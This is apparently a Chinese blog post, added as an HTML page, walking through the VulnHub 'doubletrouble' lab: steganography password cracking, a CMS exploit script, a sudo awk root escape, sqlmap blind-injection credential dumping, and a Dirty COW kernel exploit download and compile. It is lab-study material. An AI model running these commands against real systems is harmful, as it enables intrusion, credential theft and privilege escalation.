@@ -1,0 +1,286 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x13-VulnHub靶机-doubletrouble | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x13-VulnHub靶机-doubletrouble | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+靶机: https://download.vulnhub.com/doubletrouble/doubletrouble.ova
+内容
+
+
+已知cms的操作  (找已知exp or  看高版本的更新内容
+
+
+隐写术  (StegSee..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x13-VulnHub靶机-doubletrouble
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-15
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>靶机: https://download.vulnhub.com/doubletrouble/doubletrouble.ova</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>
+<p>已知cms的操作  (找已知exp or  看高版本的更新内容</p>
+</li>
+<li>
+<p>隐写术  (StegSeek 工具</p>
+</li>
+<li>
+<p>awk提权(权限配置不当)</p>
+</li>
+<li>
+<p>sql盲注 (sqlmap)   (登录界面)</p>
+</li>
+<li>
+<p>内核提权 (脏牛)</p>
+</li>
+<li>
+<p>判断文件是否相同 看他们两md5sum的值</p>
+</li>
+</ul>
+<h1 id="第一台">第一台</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的主机发现 端口扫描</p>
+<p>发现80端口 有个登录界面  弱口令没结果  sqlmap(这种可以注入的地方得试试) 跑也没结果</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151902502.png" alt="image-20240315190247472" loading="lazy"></figure>
+<p>已知cms了   去官网看看 版本更新了什么 (这些内容往往是修复的漏洞)</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151923778.png" alt="image-20240315192319740" loading="lazy"></figure>
+<p>找去找找exp      这里去kali找找 (这种国外的 )</p>
+<p>这里的exp都是需要账号密码 在后台的</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151927832.png" alt="image-20240315192702787" loading="lazy"></figure>
+<p>继续dirsearch扫     发现 /secret 目录下面有一张照片而且名字也和靶机一样</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151935443.png" alt="image-20240315193542411" loading="lazy"></figure>
+<h2 id="隐写-爆破">隐写 爆破</h2>
+<p>用 steghide看到里面有密码    说明里面肯定有东西</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151938285.png" alt="image-20240315193832262" loading="lazy"></figure>
+<p>StegSeek(高效的密码爆破工具 爆破图片密码     去破解密码<br>
+<code>stegseek --crack mao.jpg rockyou.txt</code></p>
+<p>而且直接把隐写的内容也搞出来   用这个去登80界面的那个登录界面</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151940113.png" alt="image-20240315194043085" loading="lazy"></figure>
+<h2 id="找cms漏洞拿shell">找cms漏洞拿shell</h2>
+<p>成功登入   然后再用exp拿shell   （50175.py  需要改下缩进</p>
+<p>你妹的 少个/都不行  <code>python3 50175.py -url http://192.168.3.125/ -u otisrush@localhost.com -p otis666</code></p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151518837.png" alt="3f98f551b0334847cf02c574e365455" loading="lazy"></figure>
+<p>然后nc 反弹shell</p>
+<h2 id="提权">提权</h2>
+<p>sudo -l  就看到了awk命令不要密码  去https://gtfobins.github.io/找一找利用代码</p>
+<ul>
+<li>
+<pre><code>sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+</code></pre>
+</li>
+</ul>
+<p>直接得到root</p>
+<p>然后再root目录翻到一个ova格式 还有一台要打</p>
+<p>将靶机文件传出来</p>
+<p>靶机: nc 192.168.3.120 3333 &lt; doubletrouble.ova -w 1    将文件传输给kali的3333端口，-w 1表示传输成功后1s端口连接关闭，这样子就可以看到什么时候传输成功过</p>
+<p>kali: nc -lnvp 3333 &gt; doubletrouble2.ova</p>
+<p>对比文件是否完全相同   看看两个文件的md5sum 是否完全相同</p>
+<h1 id="第二台">第二台</h1>
+<p>把靶机启动起来 常规的主机发现 端口扫描</p>
+<p>就只看到80端口有个登录界面 而且不知道是什么cms啥的   dirsearch也扫不出目录    就去试试 sql注入</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151955648.png" alt="image-20240315195533624" loading="lazy"></figure>
+<h2 id="sql盲注">SQL盲注</h2>
+<p>先 <code>sqlmap -r qwe.txt</code>   跑出来东西了  然后再继续注入</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151957396.png" alt="image-20240315195702358" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt --dbs</code>     跑出数据库</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151637067.png" alt="image-20240315163721036" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble --tables</code>    跑出表</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151641079.png" alt="image-20240315164114054" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble -T users --columns</code>  跑出列</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151645333.png" alt="image-20240315164522305" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble -T users -C  username,password  --dump</code>   查数据</p>
+<p>使用 <code>--dump</code> 选项时，sqlmap 将尝试从目标数据库中提取数据</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151652398.png" alt="image-20240315165248372" loading="lazy"></figure>
+<p>用这个两个登入80端口那个 都进不去</p>
+<p>试试ssh连接  结果真连上了</p>
+<h2 id="提权-2">提权</h2>
+<p>这里可以用内核    脏牛提权：<strong>Linux 内核2.6.22 – 3.9</strong></p>
+<p>https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</p>
+<p>gcc -Wall -o dirtycow-mem ww.c -ldl -lpthread</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151823266.png" alt="image-20240315182309215" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a>
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E7%AC%AC%E4%B8%80%E5%8F%B0">第一台</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E9%9A%90%E5%86%99-%E7%88%86%E7%A0%B4">隐写 爆破</a></li>
+<li><a href="#%E6%89%BEcms%E6%BC%8F%E6%B4%9E%E6%8B%BFshell">找cms漏洞拿shell</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+</ul>
+</li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E5%8F%B0">第二台</a>
+<ul>
+<li><a href="#sql%E7%9B%B2%E6%B3%A8">SQL盲注</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83-2">提权</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/0x10-vulnhub-ba-ji-billu_b0x/">
+              <h3 class="post-title">
+                0x11-VulnHub靶机-Billu_b0x
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
